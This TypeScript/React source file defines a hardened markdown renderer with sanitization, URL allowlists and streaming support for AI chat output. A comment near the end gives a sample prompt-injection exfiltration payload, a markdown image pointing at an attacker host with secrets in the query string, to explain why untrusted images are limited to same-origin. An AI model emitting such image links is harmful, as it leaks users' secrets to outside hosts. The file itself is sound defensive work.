/**
 * Markdown — react-markdown over `Prose`, with a streaming-repair pipeline for AI-streamed output
 * (docs/CONTENT-SPEC.md §2/§3/§6). This is the package's ONLY markdown renderer — pass
 * `streaming density="chat"` to render agent/chat text (see `agent/rules/basalt-content.md`);
 * `agent/**` deliberately ships no renderer of its own, since `agent/** -> content` is
 * lint-blocked by design.
 *
 * LAZY-LOADED: react-markdown, remark-gfm, rehype-sanitize and remend are all OPTIONAL peers,
 * loaded via `React.lazy` / dynamic `import()` (mirrors `agent/streaming-markdown.tsx` and
 * `./highlighter`) — importing `basalt-ui/content` never eagerly resolves any of them. Without
 * react-markdown or remark-gfm, `Markdown` renders the raw string as plain text; without
 * rehype-sanitize the sanitize pass is skipped (dev-warned once); without remend the streaming
 * tail renders unrepaired.
 *
 * SANITIZATION: basalt appends its own `rehype-sanitize` pass AFTER the consumer's `rehypePlugins`
 * — plugin order in unified is registration order, so last is the only position nothing can
 * outrun. `sanitizeSchema` is an ADDITIONS-only extension merged over `BASALT_SANITIZE_SCHEMA`
 * (see `./sanitize`); removing a default allowance is deliberately not expressible.
 *
 * TRUST vs STREAMING: `streaming` is a rendering mode (the text is still arriving); `contentTrust`
 * is the security input (where the text came from). They are independent — a FINISHED agent message
 * is settled AND untrusted. Only `contentTrust` selects the image allowlist default.
 *
 * Default element overrides:
 *  - `h1`..`h6` — slugged + hover-anchored (`./heading-components`).
 *  - fenced code (`pre`) — the fence-renderer registry (`./fence-block`): `fenceRenderers[lang]`,
 *    then the built-ins (a settled ` ```mermaid ` fence → `MermaidDiagram`), then `CodeBlock`.
 *  - `blockquote` — a GFM alert marker (`[!NOTE]` etc.) renders as `Callout`; otherwise passes
 *    through (`./callout-alert`).
 *  - `a`/`img` — hardened via `allowedLinkPrefixes`/`allowedImagePrefixes`/`defaultOrigin`
 *    (`./url-hardening`); a disallowed URL (including remend's `streamdown:incomplete-link`
 *    sentinel) drops the `href`/`src`, and the component renders an unlinked span / nothing.
 *
 * Streaming mode (`streaming`): `blockSplit` splits `children` into top-level blocks. Every block
 * except the last renders through a memoized renderer (`React.memo`, referentially stable
 * `components`/`urlTransform`) — only the in-flight tail block, repaired via `remend`, re-renders
 * per streamed token. Heading ids: the tail block (and, once it settles, the block it becomes) get
 * their OWN `SlugTracker` rather than sharing one document-wide tracker — a duplicate heading text
 * across two DIFFERENT blocks will not get a deduped `-1` suffix in streaming mode. Streamed chat
 * content doesn't drive a `TableOfContents`, so this is an accepted tradeoff, not a bug.
 *
 * @example
 * import { Markdown } from 'basalt-ui/content'
 *
 * <Markdown>{articleMarkdown}</Markdown>
 * <Markdown density="chat" streaming contentTrust="untrusted">{streamedText}</Markdown>
 * <Markdown fenceRenderers={{ vega: settledOnly(({ code }) => <VegaChart spec={code} />) }}>
 */
import type { CSSProperties, JSX } from 'react'
import { lazy, memo, Suspense, useEffect, useMemo, useState } from 'react'
import type {
  Components,
  ExtraProps,
  Options as ReactMarkdownOptions,
  UrlTransform,
} from 'react-markdown'
import { ALERT_CALLOUT_KIND, ALERT_TITLE, detectAlert, stripAlertMarker } from './callout-alert'
import { FenceBlock } from './fence-block'
import type { FenceRenderers } from './fence-block'
import { createHeadingComponents } from './heading-components'
import { Callout } from './callout'
import { Prose } from './prose'
import type { ProseDensity } from './prose'
import { BASALT_SANITIZE_SCHEMA, mergeSanitizeSchema } from './sanitize'
import type { SanitizeSchema, SanitizeSchemaExtension, SanitizeSchemaInput } from './sanitize'
import { SlugTracker } from './slug'
import { blockSplit } from './block-split'
import { createUrlTransform } from './url-hardening'

// ── Public types ───────────────────────────────────────────────────────────────────────────────

export type MarkdownComponents = Components

// The fence registry's public vocabulary lives in `./fence-block` (next to the built-ins it
// defines) and is re-exported here — `fenceRenderers` is a `MarkdownProps` field, so this is the
// module a consumer already imports.
export { settledOnly } from './fence-block'
export type { FenceRenderContext, FenceRenderer, FenceRenderers } from './fence-block'

/**
 * Provenance of a `Markdown` body — the ONLY input to the image-allowlist default. Deliberately not
 * a boolean: `contentTrust="untrusted"` says at the call site what it means, where `untrusted` /
 * `!trusted` would not.
 */
export type MarkdownContentTrust = 'trusted' | 'untrusted'

export type MarkdownProps = {
  /** The markdown string to render. Safe to update on every character during streaming. */
  readonly children: string
  /** Typography density passed through to `Prose`. Default `'article'`. */
  readonly density?: ProseDensity
  /** `Prose`'s measure cap. Defaults to `true` for `'article'` density, `false` for `'chat'`. */
  readonly measure?: boolean
  /** AI-stream mode — block-split + memoize + `remend`-repair the in-flight tail. Default `false`.
   * Purely a RENDERING mode: it says the text is still arriving, NOT that it is untrusted. Use
   * `contentTrust` for the security policy. */
  readonly streaming?: boolean
  /**
   * Where `children` came from — the input to the image policy, independent of `streaming`.
   * `'untrusted'` (model-generated or third-party markdown) drops the `allowedImagePrefixes`
   * default to same-origin `['/']`; `'trusted'` (your own authored content) keeps
   * `['https://', '/']`. An explicit `allowedImagePrefixes` always wins over both.
   *
   * Default: `'untrusted'` when `streaming` is set, `'trusted'` otherwise. That default only
   * preserves the pre-1.12 fail-safe — it is NOT the policy. Settledness has nothing to do with
   * trust: a FINISHED agent message is still model-generated, so any surface rendering agent text
   * must pin `contentTrust="untrusted"` explicitly rather than lean on `streaming`.
   */
  readonly contentTrust?: MarkdownContentTrust
  /**
   * Per-element overrides merged OVER the defaults (only the keys you supply are replaced).
   *
   * A CUSTOM tag admitted via `sanitizeSchema.tagNames` (e.g. `'x-callout'`) cannot be given an
   * override here: react-markdown's `Components` type is a mapped type over `JSX.IntrinsicElements`,
   * which only has entries for real HTML/SVG tags — a made-up tag name is not a valid key of it, so
   * there is no override slot for it to occupy. Style such a tag with CSS (element/attribute
   * selectors) or a wrapping component instead of trying to intercept it here.
   */
  readonly components?: MarkdownComponents
  /**
   * Fence renderers keyed by language, consulted BEFORE the built-in mermaid/`CodeBlock` dispatch.
   * Wrap a heavyweight renderer in `settledOnly` to keep it off the still-streaming tail. Pass a
   * referentially stable object — it participates in the streaming memoization.
   */
  readonly fenceRenderers?: FenceRenderers
  /**
   * ADDITIONS merged into `BASALT_SANITIZE_SCHEMA` over rehype-sanitize's `defaultSchema`.
   * Removals are not expressible — a schema handed to `rehype-sanitize` directly would replace the
   * defaults wholesale (hast-util-sanitize merges with a shallow top-level spread), which is
   * exactly the footgun this shape removes.
   */
  readonly sanitizeSchema?: SanitizeSchemaExtension
  /** Allowed `href` prefixes. Default `['https://', 'mailto:', '#', '/']`. */
  readonly allowedLinkPrefixes?: readonly string[]
  /** Allowed `img src` prefixes. Default `['https://', '/']` for trusted content, `['/']`
   * (same-origin only) when `contentTrust` resolves to `'untrusted'` — auto-fetched images are the
   * classic prompt-injection exfiltration channel, so remote origins must be opted in explicitly
   * for model-generated content. */
  readonly allowedImagePrefixes?: readonly string[]
  /** Resolves a relative `href`/`src` to an absolute URL before the allowlist check's result is used. */
  readonly defaultOrigin?: string
  /** Escape hatch — appended after `remark-gfm`. */
  readonly remarkPlugins?: readonly unknown[]
  /**
   * Escape hatch — appended after react-markdown's defaults, and BEFORE basalt's sanitize pass
   * (which always runs last, so nothing supplied here can outrun it).
   *
   * react-markdown does NOT parse raw HTML in the markdown SOURCE by default (no `rehype-raw` is
   * included here or by react-markdown itself) — a literal `<script>...</script>` typed into
   * `children` never becomes a hast element; it stays inert text and the sanitize pass never even
   * sees it. Concretely: a test that types a raw `<script>` tag into `children` and asserts it never
   * renders is NOT exercising the sanitize pass — it would pass identically with the pass removed
   * entirely, because the string was never a node the sanitizer could act on in the first place. The
   * sanitize pass only ever sees elements produced by remark/rehype PLUGINS (`remarkPlugins`,
   * `rehypePlugins`, or `rehype-raw` if a consumer adds it here) — that is the surface worth testing
   * against unsafe markup, not raw source text.
   */
  readonly rehypePlugins?: readonly unknown[]
  readonly className?: string
  readonly style?: CSSProperties
}

// ── Default element overrides ─────────────────────────────────────────────────────────────────

type LinkProps = JSX.IntrinsicElements['a'] & ExtraProps
type ImgProps = JSX.IntrinsicElements['img'] & ExtraProps
type BlockquoteProps = JSX.IntrinsicElements['blockquote'] & ExtraProps
type PreProps = JSX.IntrinsicElements['pre'] & ExtraProps

// `rest` is forwarded, not dropped: it is what the sanitize pass already vetted (only
// `defaultSchema.attributes.a` + the `'*'` list can reach here), and dropping it broke GFM
// footnotes in the other direction from the clobber bug — a ref anchor's `id` is the target of its
// own back-link, so `href="#user-content-fnref-1"` dangled with the id discarded at render time.
// `node` is react-markdown's hast handle (`ExtraProps`) and must NOT reach the DOM.
function LinkRenderer({ href, children, node: _node, ...rest }: LinkProps) {
  if (href === undefined) return <span {...rest}>{children}</span>
  const external = href.startsWith('http://') || href.startsWith('https://')
  return (
    <a href={href} {...rest} {...(external && { target: '_blank', rel: 'noreferrer noopener' })}>
      {children}
    </a>
  )
}

function ImageRenderer({ src, alt }: ImgProps) {
  // A blocked src arrives as undefined OR '' depending on how urlTransform dropped it — an
  // `<img src="">` renders the broken-image glyph, so both cases must skip the element entirely.
  if (typeof src !== 'string' || src === '') return <span aria-label={alt} />
  return <img src={src} alt={alt ?? ''} loading="lazy" />
}

function BlockquoteRenderer({ children }: BlockquoteProps) {
  const alert = detectAlert(children)
  if (!alert) return <blockquote>{children}</blockquote>
  return (
    <Callout kind={ALERT_CALLOUT_KIND[alert.kind]} title={ALERT_TITLE[alert.kind]}>
      {stripAlertMarker(children, alert.marker)}
    </Callout>
  )
}

function createPreRenderer(settled: boolean, fenceRenderers: FenceRenderers | undefined) {
  return function PreRenderer({ node }: PreProps) {
    return (
      <FenceBlock
        settled={settled}
        {...(node !== undefined && { node })}
        {...(fenceRenderers !== undefined && { renderers: fenceRenderers })}
      />
    )
  }
}

function buildMarkdownComponents(
  tracker: SlugTracker,
  settled: boolean,
  fenceRenderers: FenceRenderers | undefined,
): Components {
  return {
    ...createHeadingComponents(tracker),
    pre: createPreRenderer(settled, fenceRenderers),
    blockquote: BlockquoteRenderer,
    a: LinkRenderer,
    img: ImageRenderer,
  }
}

// ── Lazy-loaded rehype-sanitize ───────────────────────────────────────────────────────────────

/** The resolved sanitize peer: its plugin plus the `defaultSchema` it re-exports. */
type MarkdownSanitizer = {
  readonly plugin: unknown
  readonly baseSchema: SanitizeSchemaInput
}

let sanitizerPromise: Promise<MarkdownSanitizer | null> | null = null

/**
 * Module-level singleton (mirrors `./mermaid`'s `loadMermaidModule`) — resolves once, so the
 * missing-peer warning below is emitted at most once per process.
 *
 * `defaultSchema` is NOT materialized into `BASALT_SANITIZE_SCHEMA` at module scope on purpose:
 * that would need a static import of an OPTIONAL peer and hard-require it for every consumer. The
 * effective schema is composed here instead, where the peer is already in hand.
 */
function loadSanitizer(): Promise<MarkdownSanitizer | null> {
  sanitizerPromise ??= import('rehype-sanitize')
    .then((mod) => ({
      plugin: mod.default,
      // No cast: `SanitizeSchemaInput` mirrors hast-util-sanitize's `Schema` INCLUDING its
      // `| null | undefined` field arms, so `defaultSchema` assigns straight across;
      // `mergeSanitizeSchema` normalizes the nulls away and hands back a `SanitizeSchema`.
      baseSchema: mod.defaultSchema,
    }))
    .catch(() => {
      if (process.env['NODE_ENV'] !== 'production') {
        console.warn(
          '[basalt] Markdown: optional peer "rehype-sanitize" is not installed — the sanitize pass is skipped. ' +
            'react-markdown does not parse raw HTML by default, so this only opens a hole if a ' +
            'rehypePlugin (rehype-raw and friends) puts untrusted nodes into the tree. ' +
            'Install it with: bun add rehype-sanitize',
        )
      }
      return null
    })
  return sanitizerPromise
}

/**
 * GFM FOOTNOTES: exactly ONE layer may namespace ids, and it has to be `mdast-util-to-hast`'s.
 *
 * TWO layers prefix, and only one of them touches `href`. react-markdown calls `remark-rehype` with
 * no `clobberPrefix` override, so `mdast-util-to-hast` applies its own `'user-content-'` to BOTH
 * sides of a footnote link (`id="user-content-fn-1"`, `href="#user-content-fn-1"`).
 * `hast-util-sanitize` then prefixes again, unconditionally, but only the properties in
 * `defaultSchema.clobber` (`ariaDescribedBy`, `ariaLabelledBy`, `id`, `name`) — `href` is NOT among
 * them. Executed against the installed rehype-sanitize@6.0.0 / mdast-util-to-hast@13.2.1, the pass
 * emitted `id="user-content-user-content-fn-1"` next to `href="#user-content-fn-1"`, so EVERY
 * footnote link, back-link and `aria-describedby` dangled.
 *
 * REJECTED: `remarkRehypeOptions: { clobberPrefix: '' }`, letting the sanitizer own the prefixing.
 * Executed, it only moves the break — `href="#fn-1"` beside `id="user-content-fn-1"`, still
 * dangling, because the sanitizer never rewrites `href`. Also rejected: rewriting hash hrefs in
 * `urlTransform` to re-add the sanitizer's prefix — that runs on EVERY in-document link, so an
 * author's `[x](#some-heading)` would stop matching the un-prefixed slug ids basalt's heading
 * renderers generate downstream of hast.
 *
 * WHAT STILL PROTECTS IDS. Upstream skips clobbering entirely when `clobberPrefix` is falsy
 * (`hast-util-sanitize/lib/index.js:653-657`), so this trades away its `id`/`name` namespacing:
 *  - Every id markdown SYNTAX can produce is a footnote id, and `mdast-util-to-hast` still
 *    namespaces those under `user-content-fn-`/`user-content-fnref-` — including the
 *    attacker-chosen footnote identifier — on the id and the href alike.
 *  - Raw HTML never becomes an element: react-markdown ships no `rehype-raw`, so `<div id="x">` in
 *    the source stays a `raw` node the sanitize pass drops (executed: it does).
 *  - basalt's own heading ids are added by React renderers downstream of hast, so the sanitizer
 *    never saw them and never protected them.
 * The residue is a consumer whose `rehypePlugins` INJECT elements (`rehype-raw` and friends):
 * arbitrary `id`/`name` then survives un-namespaced. Such a consumer restores it by adding their
 * own clobbering pass to `rehypePlugins` — basalt's later pass does not un-prefix what an earlier
 * one prefixed.
 *
 * WHY IT IS SET HERE AND NOT AS AN EXTENSION: `mergeSanitizeSchema` deliberately IGNORES an empty
 * `clobberPrefix` from a `SanitizeSchemaExtension` (`adoptClobberPrefix` in `./sanitize`) — that is
 * the additions-only channel refusing to let OUTSIDE code disable a protection. This is not outside
 * code: basalt owns both prefixing layers here, so the pipeline-level decision belongs at the
 * composition site, past the merge. It is not a consumer knob for the same reason.
 */
function withSingleClobberLayer(schema: SanitizeSchema) {
  return { ...schema, clobberPrefix: '' }
}

/**
 * Consumer plugins first, basalt's sanitize pass LAST — "everything after rehype-sanitize could be
 * unsafe", so last is the only position nothing supplied through the escape hatch can outrun.
 *
 * Exported for the ordering test only; `./index.ts` deliberately does not re-export it.
 */
export function composeRehypePlugins({
  sanitizer,
  consumerPlugins,
  sanitizeSchema,
}: {
  readonly sanitizer: MarkdownSanitizer | null
  readonly consumerPlugins?: readonly unknown[]
  readonly sanitizeSchema?: SanitizeSchemaExtension
}): readonly unknown[] {
  const consumer = consumerPlugins ?? []
  if (sanitizer === null) return consumer
  const merged = mergeSanitizeSchema(sanitizer.baseSchema, BASALT_SANITIZE_SCHEMA, sanitizeSchema)
  return [...consumer, [sanitizer.plugin, withSingleClobberLayer(merged)]]
}

// ── Lazy-loaded react-markdown + remark-gfm ───────────────────────────────────────────────────

type RemarkPluginList = NonNullable<ReactMarkdownOptions['remarkPlugins']>
type RehypePluginList = NonNullable<ReactMarkdownOptions['rehypePlugins']>

type BridgeProps = {
  readonly text: string
  readonly components: Components
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
  readonly sanitizeSchema?: SanitizeSchemaExtension
}

function PlainTextFallback({ text }: { text: string }) {
  return <span style={{ whiteSpace: 'pre-wrap' }}>{text}</span>
}

// The dynamic import chain loads react-markdown + remark-gfm only at render time. If either peer
// is absent the import fails — `.catch` resolves to the plain-text fallback (no unhandled
// rejection, no crash), the same optional-peer contract as `agent/streaming-markdown.tsx`.
// `loadSanitizer` swallows its OWN failure (resolving to `null`), so a missing rehype-sanitize
// degrades the sanitize pass alone rather than dropping the whole renderer to plain text.
const LazyReactMarkdown = lazy(() =>
  Promise.all([import('react-markdown'), import('remark-gfm'), loadSanitizer()])
    .then(([{ default: ReactMarkdown }, { default: remarkGfm }, sanitizer]) => {
      function Bridge({
        text,
        components,
        urlTransform,
        remarkPlugins,
        rehypePlugins,
        sanitizeSchema,
      }: BridgeProps) {
        const remarkPluginsList: RemarkPluginList = [
          remarkGfm,
          ...((remarkPlugins ?? []) as RemarkPluginList),
        ]
        const rehypePluginsList = useMemo(
          () =>
            composeRehypePlugins({
              sanitizer,
              ...(rehypePlugins !== undefined && { consumerPlugins: rehypePlugins }),
              ...(sanitizeSchema !== undefined && { sanitizeSchema }),
            }) as RehypePluginList,
          // `sanitizer` is a constant of the enclosing load closure — resolved once, before this
          // component exists, so it is deliberately not a dependency.
          [rehypePlugins, sanitizeSchema],
        )
        return (
          <ReactMarkdown
            components={components}
            urlTransform={urlTransform}
            remarkPlugins={remarkPluginsList}
            rehypePlugins={rehypePluginsList}
          >
            {text}
          </ReactMarkdown>
        )
      }
      return { default: Bridge }
    })
    .catch(() => ({ default: ({ text }: BridgeProps) => <PlainTextFallback text={text} /> })),
)
Object.assign(LazyReactMarkdown, { displayName: 'LazyReactMarkdown' })

// ── Streaming block rendering ──────────────────────────────────────────────────────────────────

type BlockProps = {
  readonly text: string
  readonly settled: boolean
  readonly components?: MarkdownComponents
  readonly fenceRenderers?: FenceRenderers
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
  readonly sanitizeSchema?: SanitizeSchemaExtension
}

// A fresh SlugTracker per block (not shared across blocks) — see the module JSDoc's streaming-mode
// heading-id tradeoff. Recreated only when `text` changes, so a memoized (settled) block's tracker
// is created exactly once.
function BlockRenderer({
  text,
  settled,
  components,
  fenceRenderers,
  urlTransform,
  remarkPlugins,
  rehypePlugins,
  sanitizeSchema,
}: BlockProps) {
  // `text` isn't read in the factory below — it's the reset KEY, forcing a fresh tracker per block.
  // oxlint-disable-next-line react-hooks/exhaustive-deps
  const tracker = useMemo(() => new SlugTracker(), [text])
  const componentsMap = useMemo(
    () => ({ ...buildMarkdownComponents(tracker, settled, fenceRenderers), ...components }),
    [tracker, settled, fenceRenderers, components],
  )
  return (
    <LazyReactMarkdown
      text={text}
      components={componentsMap}
      urlTransform={urlTransform}
      {...(remarkPlugins !== undefined && { remarkPlugins })}
      {...(rehypePlugins !== undefined && { rehypePlugins })}
      {...(sanitizeSchema !== undefined && { sanitizeSchema })}
    />
  )
}

// Referential stability of `components`/`urlTransform` (both memoized by the caller) is what makes
// this memo skip re-rendering an unchanged settled block — see the module JSDoc.
const MemoizedBlock = memo(BlockRenderer)
MemoizedBlock.displayName = 'MemoizedBlock'

// ── Lazy-loaded remend ─────────────────────────────────────────────────────────────────────────

type RemendFn = (text: string) => string

let remendPromise: Promise<RemendFn | null> | null = null
/** Set once the singleton resolves, so a LATER-mounted tail starts repaired instead of paying the
 * one unrepaired render again. */
let resolvedRemend: RemendFn | null = null

/** Module-level singleton, same optional-peer contract as `./mermaid`'s `loadMermaidModule`. */
function loadRemend(): Promise<RemendFn | null> {
  remendPromise ??= import('remend')
    .then((mod) => {
      resolvedRemend = mod.default
      return resolvedRemend
    })
    .catch(() => null)
  return remendPromise
}

/**
 * `null` until `remend` resolves — and forever if the optional peer is absent. The tail then
 * renders its RAW text: a streaming tail is re-rendered per token anyway, so the worst case is one
 * unrepaired frame at the very start of the first stream, never a blank block or an error.
 */
function useRemend(): RemendFn | null {
  const [repair, setRepair] = useState<RemendFn | null>(() => resolvedRemend)

  useEffect(() => {
    if (repair !== null) return
    let cancelled = false
    loadRemend().then((loaded) => {
      // `setRepair(loaded)` would treat the function as a state UPDATER — wrap it.
      if (!cancelled && loaded !== null) setRepair(() => loaded)
      return undefined
    })
    return () => {
      cancelled = true
    }
  }, [repair])

  return repair
}

function StreamingTailBlock(props: Omit<BlockProps, 'settled'>) {
  const repair = useRemend()
  const repaired = useMemo(
    () => (repair === null ? props.text : repair(props.text)),
    [repair, props.text],
  )
  return <BlockRenderer {...props} text={repaired} settled={false} />
}

type BodyProps = {
  readonly text: string
  readonly components?: MarkdownComponents
  readonly fenceRenderers?: FenceRenderers
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
  readonly sanitizeSchema?: SanitizeSchemaExtension
}

function SettledBody({
  text,
  components,
  fenceRenderers,
  urlTransform,
  remarkPlugins,
  rehypePlugins,
  sanitizeSchema,
}: BodyProps) {
  return (
    <Suspense fallback={<PlainTextFallback text={text} />}>
      <BlockRenderer
        text={text}
        settled
        urlTransform={urlTransform}
        {...(components !== undefined && { components })}
        {...(fenceRenderers !== undefined && { fenceRenderers })}
        {...(remarkPlugins !== undefined && { remarkPlugins })}
        {...(rehypePlugins !== undefined && { rehypePlugins })}
        {...(sanitizeSchema !== undefined && { sanitizeSchema })}
      />
    </Suspense>
  )
}

function StreamingBody({
  text,
  components,
  fenceRenderers,
  urlTransform,
  remarkPlugins,
  rehypePlugins,
  sanitizeSchema,
}: BodyProps) {
  const blocks = useMemo(() => blockSplit(text), [text])
  const lastIndex = blocks.length - 1

  return (
    <Suspense fallback={<PlainTextFallback text={text} />}>
      {blocks.map((block, index) => {
        const shared = {
          text: block,
          urlTransform,
          ...(components !== undefined && { components }),
          ...(fenceRenderers !== undefined && { fenceRenderers }),
          ...(remarkPlugins !== undefined && { remarkPlugins }),
          ...(rehypePlugins !== undefined && { rehypePlugins }),
          ...(sanitizeSchema !== undefined && { sanitizeSchema }),
        }
        // Block positions are stable during a stream (only the tail is ever replaced in place),
        // so the array index is a safe, stable `key` here.
        return index === lastIndex ? (
          <StreamingTailBlock key={index} {...shared} />
        ) : (
          <MemoizedBlock key={index} {...shared} settled />
        )
      })}
    </Suspense>
  )
}

// ── Markdown ───────────────────────────────────────────────────────────────────────────────────

const DEFAULT_LINK_PREFIXES: readonly string[] = ['https://', 'mailto:', '#', '/']
const TRUSTED_IMAGE_PREFIXES: readonly string[] = ['https://', '/']
/* Untrusted (model-generated) markdown: images auto-fetch, so an open `https://` default is a
 * prompt-injection exfiltration channel (`![](https://attacker/?q=<secrets>)`). Same-origin only
 * unless the consumer opts specific origins in. Links stay clickable — navigation is user-initiated. */
const UNTRUSTED_IMAGE_PREFIXES: readonly string[] = ['/']

const IMAGE_PREFIXES_BY_TRUST: Readonly<Record<MarkdownContentTrust, readonly string[]>> = {
  trusted: TRUSTED_IMAGE_PREFIXES,
  untrusted: UNTRUSTED_IMAGE_PREFIXES,
}

/**
 * Restricts the lookup to OWN keys of `IMAGE_PREFIXES_BY_TRUST` — same guarding shape as
 * `./fence-block`'s `lookupFenceRenderer` for the model-controlled fence-language registry.
 * `contentTrust` is typed `MarkdownContentTrust`, but that is a compile-time promise only: a plain-
 * JS consumer, or an `as` cast past the type, can hand this ANY string, and `IMAGE_PREFIXES_BY_TRUST`
 * is a plain object literal — indexing it with an unchecked key resolves `Object.prototype` members.
 *
 * EXECUTED against this build, neither bad input "fails closed" on its own:
 *  - an unrecognised key (`'nonsense'`) resolves `allowedImagePrefixes` to `undefined`;
 *  - a prototype key (`'toString'`, `'constructor'`, …) resolves to a FUNCTION, not a string array.
 * Both then reach `createUrlTransform`'s `isAllowedUrl`, which unconditionally calls
 * `prefixes.some(...)` — `undefined.some` and `Function.prototype.some` are both not a function, so
 * both inputs CRASH the render with an uncaught `TypeError` the instant an `img` is transformed
 * (nothing between `Markdown` and react-markdown's `img` visit catches it). That is not "degrades to
 * plain text with the image dropped" — it takes the whole message down, which is worse than an
 * incidental fail-closed and not something to build on regardless. Fail closed on purpose: an
 * unrecognised or non-own-property `contentTrust` gets the MOST RESTRICTIVE policy (same-origin
 * only), never `undefined` and never a permissive default.
 */
function isKnownContentTrust(value: string): value is MarkdownContentTrust {
  return Object.hasOwn(IMAGE_PREFIXES_BY_TRUST, value)
}

function imagePrefixesForTrust(contentTrust: string): readonly string[] {
  return isKnownContentTrust(contentTrust)
    ? IMAGE_PREFIXES_BY_TRUST[contentTrust]
    : UNTRUSTED_IMAGE_PREFIXES
}

export function Markdown({
  children,
  density = 'article',
  measure,
  streaming = false,
  // `streaming` as the trust DEFAULT is backward compatibility only (pre-1.12 the image policy was
  // read straight off `streaming`, so dropping it would silently widen every existing streaming
  // call site). It is a floor, never the policy — see the prop's JSDoc.
  contentTrust = streaming ? 'untrusted' : 'trusted',
  components,
  fenceRenderers,
  sanitizeSchema,
  allowedLinkPrefixes = DEFAULT_LINK_PREFIXES,
  allowedImagePrefixes = imagePrefixesForTrust(contentTrust),
  defaultOrigin,
  remarkPlugins,
  rehypePlugins,
  className,
  style,
}: MarkdownProps) {
  const resolvedMeasure = measure ?? density === 'article'

  const urlTransform = useMemo<UrlTransform>(
    () =>
      createUrlTransform({
        allowedLinkPrefixes,
        allowedImagePrefixes,
        ...(defaultOrigin !== undefined && { defaultOrigin }),
      }),
    [allowedLinkPrefixes, allowedImagePrefixes, defaultOrigin],
  )

  const bodyProps: BodyProps = {
    text: children,
    urlTransform,
    ...(components !== undefined && { components }),
    ...(fenceRenderers !== undefined && { fenceRenderers }),
    ...(remarkPlugins !== undefined && { remarkPlugins }),
    ...(rehypePlugins !== undefined && { rehypePlugins }),
    ...(sanitizeSchema !== undefined && { sanitizeSchema }),
  }

  return (
    <Prose
      density={density}
      measure={resolvedMeasure}
      {...(className !== undefined && { className })}
      {...(style !== undefined && { style })}
    >
      {streaming ? <StreamingBody {...bodyProps} /> : <SettledBody {...bodyProps} />}
    </Prose>
  )
}
